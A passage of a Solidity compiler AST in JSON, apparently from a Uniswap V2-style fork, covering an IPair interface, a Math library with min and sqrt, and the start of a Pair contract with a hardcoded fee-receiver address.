													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "2787:12:4"
									},
									"returnParameters": {
										"id": 838,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "2808:0:4"
									},
									"scope": 852,
									"src": "2774:35:4",
									"stateMutability": "nonpayable",
									"superFunction": null,
									"visibility": "external"
								},
								{
									"body": null,
									"documentation": null,
									"id": 842,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "sync",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 840,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "2828:2:4"
									},
									"returnParameters": {
										"id": 841,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "2839:0:4"
									},
									"scope": 852,
									"src": "2815:25:4",
									"stateMutability": "nonpayable",
									"superFunction": null,
									"visibility": "external"
								},
								{
									"body": null,
									"documentation": null,
									"id": 851,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "initialize",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 849,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 844,
												"name": "",
												"nodeType": "VariableDeclaration",
												"scope": 851,
												"src": "2866:7:4",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 843,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "2866:7:4",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 846,
												"name": "",
												"nodeType": "VariableDeclaration",
												"scope": 851,
												"src": "2875:7:4",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 845,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "2875:7:4",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 848,
												"name": "",
												"nodeType": "VariableDeclaration",
												"scope": 851,
												"src": "2884:4:4",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 847,
													"name": "uint",
													"nodeType": "ElementaryTypeName",
													"src": "2884:4:4",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "2865:24:4"
									},
									"returnParameters": {
										"id": 850,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "2898:0:4"
									},
									"scope": 852,
									"src": "2846:53:4",
									"stateMutability": "nonpayable",
									"superFunction": null,
									"visibility": "external"
								}
							],
							"scope": 853,
							"src": "62:2849:4"
						}
					],
					"src": "36:2876:4"
				},
				"id": 4
			},
			"Math.sol": {
				"ast": {
					"absolutePath": "Math.sol",
					"exportedSymbols": {
						"Math": [
							928
						]
					},
					"id": 929,
					"nodeType": "SourceUnit",
					"nodes": [
						{
							"id": 854,
							"literals": [
								"solidity",
								"=",
								"0.5",
								".16"
							],
							"nodeType": "PragmaDirective",
							"src": "36:24:5"
						},
						{
							"baseContracts": [],
							"contractDependencies": [],
							"contractKind": "library",
							"documentation": null,
							"fullyImplemented": true,
							"id": 928,
							"linearizedBaseContracts": [
								928
							],
							"name": "Math",
							"nodeType": "ContractDefinition",
							"nodes": [
								{
									"body": {
										"id": 872,
										"nodeType": "Block",
										"src": "203:34:5",
										"statements": [
											{
												"expression": {
													"argumentTypes": null,
													"id": 870,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftHandSide": {
														"argumentTypes": null,
														"id": 863,
														"name": "z",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 861,
														"src": "213:1:5",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "Assignment",
													"operator": "=",
													"rightHandSide": {
														"argumentTypes": null,
														"condition": {
															"argumentTypes": null,
															"commonType": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															"id": 866,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"leftExpression": {
																"argumentTypes": null,
																"id": 864,
																"name": "x",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 856,
																"src": "217:1:5",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"nodeType": "BinaryOperation",
															"operator": "<",
															"rightExpression": {
																"argumentTypes": null,
																"id": 865,
																"name": "y",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 858,
																"src": "221:1:5",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"src": "217:5:5",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														},
														"falseExpression": {
															"argumentTypes": null,
															"id": 868,
															"name": "y",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 858,
															"src": "229:1:5",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"id": 869,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"nodeType": "Conditional",
														"src": "217:13:5",
														"trueExpression": {
															"argumentTypes": null,
															"id": 867,
															"name": "x",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 856,
															"src": "225:1:5",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "213:17:5",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"id": 871,
												"nodeType": "ExpressionStatement",
												"src": "213:17:5"
											}
										]
									},
									"documentation": null,
									"id": 873,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "min",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 859,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 856,
												"name": "x",
												"nodeType": "VariableDeclaration",
												"scope": 873,
												"src": "147:9:5",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 855,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "147:7:5",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 858,
												"name": "y",
												"nodeType": "VariableDeclaration",
												"scope": 873,
												"src": "158:9:5",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 857,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "158:7:5",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "146:22:5"
									},
									"returnParameters": {
										"id": 862,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 861,
												"name": "z",
												"nodeType": "VariableDeclaration",
												"scope": 873,
												"src": "192:9:5",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 860,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "192:7:5",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "191:11:5"
									},
									"scope": 928,
									"src": "134:103:5",
									"stateMutability": "pure",
									"superFunction": null,
									"visibility": "internal"
								},
								{
									"body": {
										"id": 926,
										"nodeType": "Block",
										"src": "411:242:5",
										"statements": [
											{
												"condition": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 882,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"id": 880,
														"name": "y",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 875,
														"src": "425:1:5",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": ">",
													"rightExpression": {
														"argumentTypes": null,
														"hexValue": "33",
														"id": 881,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"kind": "number",
														"lValueRequested": false,
														"nodeType": "Literal",
														"src": "429:1:5",
														"subdenomination": null,
														"typeDescriptions": {
															"typeIdentifier": "t_rational_3_by_1",
															"typeString": "int_const 3"
														},
														"value": "3"
													},
													"src": "425:5:5",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"falseBody": {
													"condition": {
														"argumentTypes": null,
														"commonType": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"id": 918,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"leftExpression": {
															"argumentTypes": null,
															"id": 916,
															"name": "y",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 875,
															"src": "609:1:5",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"nodeType": "BinaryOperation",
														"operator": "!=",
														"rightExpression": {
															"argumentTypes": null,
															"hexValue": "30",
															"id": 917,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "number",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "614:1:5",
															"subdenomination": null,
															"typeDescriptions": {
																"typeIdentifier": "t_rational_0_by_1",
																"typeString": "int_const 0"
															},
															"value": "0"
														},
														"src": "609:6:5",
														"typeDescriptions": {
															"typeIdentifier": "t_bool",
															"typeString": "bool"
														}
													},
													"falseBody": null,
													"id": 924,
													"nodeType": "IfStatement",
													"src": "605:42:5",
													"trueBody": {
														"id": 923,
														"nodeType": "Block",
														"src": "617:30:5",
														"statements": [
															{
																"expression": {
																	"argumentTypes": null,
																	"id": 921,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"lValueRequested": false,
																	"leftHandSide": {
																		"argumentTypes": null,
																		"id": 919,
																		"name": "z",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 878,
																		"src": "631:1:5",
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		}
																	},
																	"nodeType": "Assignment",
																	"operator": "=",
																	"rightHandSide": {
																		"argumentTypes": null,
																		"hexValue": "31",
																		"id": 920,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": true,
																		"kind": "number",
																		"lValueRequested": false,
																		"nodeType": "Literal",
																		"src": "635:1:5",
																		"subdenomination": null,
																		"typeDescriptions": {
																			"typeIdentifier": "t_rational_1_by_1",
																			"typeString": "int_const 1"
																		},
																		"value": "1"
																	},
																	"src": "631:5:5",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"id": 922,
																"nodeType": "ExpressionStatement",
																"src": "631:5:5"
															}
														]
													}
												},
												"id": 925,
												"nodeType": "IfStatement",
												"src": "421:226:5",
												"trueBody": {
													"id": 915,
													"nodeType": "Block",
													"src": "432:167:5",
													"statements": [
														{
															"expression": {
																"argumentTypes": null,
																"id": 885,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftHandSide": {
																	"argumentTypes": null,
																	"id": 883,
																	"name": "z",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 878,
																	"src": "446:1:5",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"nodeType": "Assignment",
																"operator": "=",
																"rightHandSide": {
																	"argumentTypes": null,
																	"id": 884,
																	"name": "y",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 875,
																	"src": "450:1:5",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"src": "446:5:5",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"id": 886,
															"nodeType": "ExpressionStatement",
															"src": "446:5:5"
														},
														{
															"assignments": [
																888
															],
															"declarations": [
																{
																	"constant": false,
																	"id": 888,
																	"name": "x",
																	"nodeType": "VariableDeclaration",
																	"scope": 915,
																	"src": "465:9:5",
																	"stateVariable": false,
																	"storageLocation": "default",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	},
																	"typeName": {
																		"id": 887,
																		"name": "uint256",
																		"nodeType": "ElementaryTypeName",
																		"src": "465:7:5",
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		}
																	},
																	"value": null,
																	"visibility": "internal"
																}
															],
															"id": 894,
															"initialValue": {
																"argumentTypes": null,
																"commonType": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																},
																"id": 893,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftExpression": {
																	"argumentTypes": null,
																	"commonType": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	},
																	"id": 891,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"lValueRequested": false,
																	"leftExpression": {
																		"argumentTypes": null,
																		"id": 889,
																		"name": "y",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 875,
																		"src": "477:1:5",
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		}
																	},
																	"nodeType": "BinaryOperation",
																	"operator": "/",
																	"rightExpression": {
																		"argumentTypes": null,
																		"hexValue": "32",
																		"id": 890,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": true,
																		"kind": "number",
																		"lValueRequested": false,
																		"nodeType": "Literal",
																		"src": "481:1:5",
																		"subdenomination": null,
																		"typeDescriptions": {
																			"typeIdentifier": "t_rational_2_by_1",
																			"typeString": "int_const 2"
																		},
																		"value": "2"
																	},
																	"src": "477:5:5",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"nodeType": "BinaryOperation",
																"operator": "+",
																"rightExpression": {
																	"argumentTypes": null,
																	"hexValue": "31",
																	"id": 892,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"kind": "number",
																	"lValueRequested": false,
																	"nodeType": "Literal",
																	"src": "485:1:5",
																	"subdenomination": null,
																	"typeDescriptions": {
																		"typeIdentifier": "t_rational_1_by_1",
																		"typeString": "int_const 1"
																	},
																	"value": "1"
																},
																"src": "477:9:5",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"nodeType": "VariableDeclarationStatement",
															"src": "465:21:5"
														},
														{
															"body": {
																"id": 913,
																"nodeType": "Block",
																"src": "514:75:5",
																"statements": [
																	{
																		"expression": {
																			"argumentTypes": null,
																			"id": 900,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": false,
																			"lValueRequested": false,
																			"leftHandSide": {
																				"argumentTypes": null,
																				"id": 898,
																				"name": "z",
																				"nodeType": "Identifier",
																				"overloadedDeclarations": [],
																				"referencedDeclaration": 878,
																				"src": "532:1:5",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint256",
																					"typeString": "uint256"
																				}
																			},
																			"nodeType": "Assignment",
																			"operator": "=",
																			"rightHandSide": {
																				"argumentTypes": null,
																				"id": 899,
																				"name": "x",
																				"nodeType": "Identifier",
																				"overloadedDeclarations": [],
																				"referencedDeclaration": 888,
																				"src": "536:1:5",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint256",
																					"typeString": "uint256"
																				}
																			},
																			"src": "532:5:5",
																			"typeDescriptions": {
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			}
																		},
																		"id": 901,
																		"nodeType": "ExpressionStatement",
																		"src": "532:5:5"
																	},
																	{
																		"expression": {
																			"argumentTypes": null,
																			"id": 911,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": false,
																			"lValueRequested": false,
																			"leftHandSide": {
																				"argumentTypes": null,
																				"id": 902,
																				"name": "x",
																				"nodeType": "Identifier",
																				"overloadedDeclarations": [],
																				"referencedDeclaration": 888,
																				"src": "555:1:5",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint256",
																					"typeString": "uint256"
																				}
																			},
																			"nodeType": "Assignment",
																			"operator": "=",
																			"rightHandSide": {
																				"argumentTypes": null,
																				"commonType": {
																					"typeIdentifier": "t_uint256",
																					"typeString": "uint256"
																				},
																				"id": 910,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": false,
																				"lValueRequested": false,
																				"leftExpression": {
																					"argumentTypes": null,
																					"components": [
																						{
																							"argumentTypes": null,
																							"commonType": {
																								"typeIdentifier": "t_uint256",
																								"typeString": "uint256"
																							},
																							"id": 907,
																							"isConstant": false,
																							"isLValue": false,
																							"isPure": false,
																							"lValueRequested": false,
																							"leftExpression": {
																								"argumentTypes": null,
																								"commonType": {
																									"typeIdentifier": "t_uint256",
																									"typeString": "uint256"
																								},
																								"id": 905,
																								"isConstant": false,
																								"isLValue": false,
																								"isPure": false,
																								"lValueRequested": false,
																								"leftExpression": {
																									"argumentTypes": null,
																									"id": 903,
																									"name": "y",
																									"nodeType": "Identifier",
																									"overloadedDeclarations": [],
																									"referencedDeclaration": 875,
																									"src": "560:1:5",
																									"typeDescriptions": {
																										"typeIdentifier": "t_uint256",
																										"typeString": "uint256"
																									}
																								},
																								"nodeType": "BinaryOperation",
																								"operator": "/",
																								"rightExpression": {
																									"argumentTypes": null,
																									"id": 904,
																									"name": "x",
																									"nodeType": "Identifier",
																									"overloadedDeclarations": [],
																									"referencedDeclaration": 888,
																									"src": "564:1:5",
																									"typeDescriptions": {
																										"typeIdentifier": "t_uint256",
																										"typeString": "uint256"
																									}
																								},
																								"src": "560:5:5",
																								"typeDescriptions": {
																									"typeIdentifier": "t_uint256",
																									"typeString": "uint256"
																								}
																							},
																							"nodeType": "BinaryOperation",
																							"operator": "+",
																							"rightExpression": {
																								"argumentTypes": null,
																								"id": 906,
																								"name": "x",
																								"nodeType": "Identifier",
																								"overloadedDeclarations": [],
																								"referencedDeclaration": 888,
																								"src": "568:1:5",
																								"typeDescriptions": {
																									"typeIdentifier": "t_uint256",
																									"typeString": "uint256"
																								}
																							},
																							"src": "560:9:5",
																							"typeDescriptions": {
																								"typeIdentifier": "t_uint256",
																								"typeString": "uint256"
																							}
																						}
																					],
																					"id": 908,
																					"isConstant": false,
																					"isInlineArray": false,
																					"isLValue": false,
																					"isPure": false,
																					"lValueRequested": false,
																					"nodeType": "TupleExpression",
																					"src": "559:11:5",
																					"typeDescriptions": {
																						"typeIdentifier": "t_uint256",
																						"typeString": "uint256"
																					}
																				},
																				"nodeType": "BinaryOperation",
																				"operator": "/",
																				"rightExpression": {
																					"argumentTypes": null,
																					"hexValue": "32",
																					"id": 909,
																					"isConstant": false,
																					"isLValue": false,
																					"isPure": true,
																					"kind": "number",
																					"lValueRequested": false,
																					"nodeType": "Literal",
																					"src": "573:1:5",
																					"subdenomination": null,
																					"typeDescriptions": {
																						"typeIdentifier": "t_rational_2_by_1",
																						"typeString": "int_const 2"
																					},
																					"value": "2"
																				},
																				"src": "559:15:5",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint256",
																					"typeString": "uint256"
																				}
																			},
																			"src": "555:19:5",
																			"typeDescriptions": {
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			}
																		},
																		"id": 912,
																		"nodeType": "ExpressionStatement",
																		"src": "555:19:5"
																	}
																]
															},
															"condition": {
																"argumentTypes": null,
																"commonType": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																},
																"id": 897,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftExpression": {
																	"argumentTypes": null,
																	"id": 895,
																	"name": "x",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 888,
																	"src": "507:1:5",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"nodeType": "BinaryOperation",
																"operator": "<",
																"rightExpression": {
																	"argumentTypes": null,
																	"id": 896,
																	"name": "z",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 878,
																	"src": "511:1:5",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"src": "507:5:5",
																"typeDescriptions": {
																	"typeIdentifier": "t_bool",
																	"typeString": "bool"
																}
															},
															"id": 914,
															"nodeType": "WhileStatement",
															"src": "500:89:5"
														}
													]
												}
											}
										]
									},
									"documentation": null,
									"id": 927,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "sqrt",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 876,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 875,
												"name": "y",
												"nodeType": "VariableDeclaration",
												"scope": 927,
												"src": "366:9:5",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 874,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "366:7:5",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "365:11:5"
									},
									"returnParameters": {
										"id": 879,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 878,
												"name": "z",
												"nodeType": "VariableDeclaration",
												"scope": 927,
												"src": "400:9:5",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 877,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "400:7:5",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "399:11:5"
									},
									"scope": 928,
									"src": "352:301:5",
									"stateMutability": "pure",
									"superFunction": null,
									"visibility": "internal"
								}
							],
							"scope": 929,
							"src": "115:540:5"
						}
					],
					"src": "36:620:5"
				},
				"id": 5
			},
			"Pair.sol": {
				"ast": {
					"absolutePath": "Pair.sol",
					"exportedSymbols": {
						"Pair": [
							2224
						]
					},
					"id": 2225,
					"nodeType": "SourceUnit",
					"nodes": [
						{
							"id": 930,
							"literals": [
								"solidity",
								"=",
								"0.5",
								".16"
							],
							"nodeType": "PragmaDirective",
							"src": "36:24:6"
						},
						{
							"absolutePath": "IPair.sol",
							"file": "./IPair.sol",
							"id": 931,
							"nodeType": "ImportDirective",
							"scope": 2225,
							"sourceUnit": 853,
							"src": "62:21:6",
							"symbolAliases": [],
							"unitAlias": ""
						},
						{
							"absolutePath": "ERC20.sol",
							"file": "./ERC20.sol",
							"id": 932,
							"nodeType": "ImportDirective",
							"scope": 2225,
							"sourceUnit": 436,
							"src": "84:21:6",
							"symbolAliases": [],
							"unitAlias": ""
						},
						{
							"absolutePath": "Math.sol",
							"file": "./Math.sol",
							"id": 933,
							"nodeType": "ImportDirective",
							"scope": 2225,
							"sourceUnit": 929,
							"src": "106:20:6",
							"symbolAliases": [],
							"unitAlias": ""
						},
						{
							"absolutePath": "UQ112x112.sol",
							"file": "./UQ112x112.sol",
							"id": 934,
							"nodeType": "ImportDirective",
							"scope": 2225,
							"sourceUnit": 2342,
							"src": "127:25:6",
							"symbolAliases": [],
							"unitAlias": ""
						},
						{
							"absolutePath": "IERC20.sol",
							"file": "./IERC20.sol",
							"id": 935,
							"nodeType": "ImportDirective",
							"scope": 2225,
							"sourceUnit": 534,
							"src": "153:22:6",
							"symbolAliases": [],
							"unitAlias": ""
						},
						{
							"absolutePath": "IFactory.sol",
							"file": "./IFactory.sol",
							"id": 936,
							"nodeType": "ImportDirective",
							"scope": 2225,
							"sourceUnit": 602,
							"src": "176:24:6",
							"symbolAliases": [],
							"unitAlias": ""
						},
						{
							"absolutePath": "ICallee.sol",
							"file": "./ICallee.sol",
							"id": 937,
							"nodeType": "ImportDirective",
							"scope": 2225,
							"sourceUnit": 450,
							"src": "201:23:6",
							"symbolAliases": [],
							"unitAlias": ""
						},
						{
							"baseContracts": [
								{
									"arguments": null,
									"baseName": {
										"contractScope": null,
										"id": 938,
										"name": "IPair",
										"nodeType": "UserDefinedTypeName",
										"referencedDeclaration": 852,
										"src": "243:5:6",
										"typeDescriptions": {
											"typeIdentifier": "t_contract$_IPair_$852",
											"typeString": "contract IPair"
										}
									},
									"id": 939,
									"nodeType": "InheritanceSpecifier",
									"src": "243:5:6"
								},
								{
									"arguments": null,
									"baseName": {
										"contractScope": null,
										"id": 940,
										"name": "ERC20",
										"nodeType": "UserDefinedTypeName",
										"referencedDeclaration": 435,
										"src": "250:5:6",
										"typeDescriptions": {
											"typeIdentifier": "t_contract$_ERC20_$435",
											"typeString": "contract ERC20"
										}
									},
									"id": 941,
									"nodeType": "InheritanceSpecifier",
									"src": "250:5:6"
								}
							],
							"contractDependencies": [
								435,
								533,
								852
							],
							"contractKind": "contract",
							"documentation": null,
							"fullyImplemented": true,
							"id": 2224,
							"linearizedBaseContracts": [
								2224,
								435,
								533,
								852
							],
							"name": "Pair",
							"nodeType": "ContractDefinition",
							"nodes": [
								{
									"id": 944,
									"libraryName": {
										"contractScope": null,
										"id": 942,
										"name": "SafeMath",
										"nodeType": "UserDefinedTypeName",
										"referencedDeclaration": 2299,
										"src": "268:8:6",
										"typeDescriptions": {
											"typeIdentifier": "t_contract$_SafeMath_$2299",
											"typeString": "library SafeMath"
										}
									},
									"nodeType": "UsingForDirective",
									"src": "262:24:6",
									"typeName": {
										"id": 943,
										"name": "uint",
										"nodeType": "ElementaryTypeName",
										"src": "281:4:6",
										"typeDescriptions": {
											"typeIdentifier": "t_uint256",
											"typeString": "uint256"
										}
									}
								},
								{
									"id": 947,
									"libraryName": {
										"contractScope": null,
										"id": 945,
										"name": "UQ112x112",
										"nodeType": "UserDefinedTypeName",
										"referencedDeclaration": 2341,
										"src": "297:9:6",
										"typeDescriptions": {
											"typeIdentifier": "t_contract$_UQ112x112_$2341",
											"typeString": "library UQ112x112"
										}
									},
									"nodeType": "UsingForDirective",
									"src": "291:28:6",
									"typeName": {
										"id": 946,
										"name": "uint224",
										"nodeType": "ElementaryTypeName",
										"src": "311:7:6",
										"typeDescriptions": {
											"typeIdentifier": "t_uint224",
											"typeString": "uint224"
										}
									}
								},
								{
									"constant": false,
									"id": 950,
									"name": "FeeResiver",
									"nodeType": "VariableDeclaration",
									"scope": 2224,
									"src": "325:70:6",
									"stateVariable": true,
									"storageLocation": "default",
									"typeDescriptions": {
										"typeIdentifier": "t_address",
										"typeString": "address"
									},
									"typeName": {
										"id": 948,
										"name": "address",
										"nodeType": "ElementaryTypeName",
										"src": "325:7:6",
										"stateMutability": "nonpayable",
										"typeDescriptions": {
											"typeIdentifier": "t_address",
											"typeString": "address"
										}
									},
									"value": {
										"argumentTypes": null,
										"hexValue": "307839453934456536394633436443643545373465303535363337333645343637396441366442343463",
										"id": 949,
										"isConstant": false,
										"isLValue": false,
										"isPure": true,
										"kind": "number",
										"lValueRequested": false,
										"nodeType": "Literal",
										"src": "353:42:6",
										"subdenomination": null,
										"typeDescriptions": {
											"typeIdentifier": "t_address_payable",
											"typeString": "address payable"
										},
										"value": "0x9E94Ee69F3CdCd5E74e05563736E4679dA6dB44c"
									},
									"visibility": "public"
								},
								{
									"constant": true,
									"id": 955,
									"name": "MINIMUM_LIQUIDITY",
									"nodeType": "VariableDeclaration",
									"scope": 2224,
									"src": "402:48:6",
									"stateVariable": true,
									"storageLocation": "default",
									"typeDescriptions": {
										"typeIdentifier": "t_uint256",
										"typeString": "uint256"
									},
									"typeName": {
										"id": 951,
										"name": "uint",
										"nodeType": "ElementaryTypeName",
										"src": "402:4:6",
										"typeDescriptions": {
											"typeIdentifier": "t_uint256",
											"typeString": "uint256"
										}
									},
									"value": {
										"argumentTypes": null,
										"commonType": {
											"typeIdentifier": "t_rational_1000_by_1",
											"typeString": "int_const 1000"
										},
										"id": 954,
										"isConstant": false,
										"isLValue": false,
										"isPure": true,
										"lValueRequested": false,
										"leftExpression": {
											"argumentTypes": null,
											"hexValue": "3130",
											"id": 952,
											"isConstant": false,
											"isLValue": false,
											"isPure": true,
											"kind": "number",
											"lValueRequested": false,
											"nodeType": "Literal",
											"src": "443:2:6",
											"subdenomination": null,
											"typeDescriptions": {
												"typeIdentifier": "t_rational_10_by_1",
												"typeString": "int_const 10"
											},
											"value": "10"
										},
										"nodeType": "BinaryOperation",
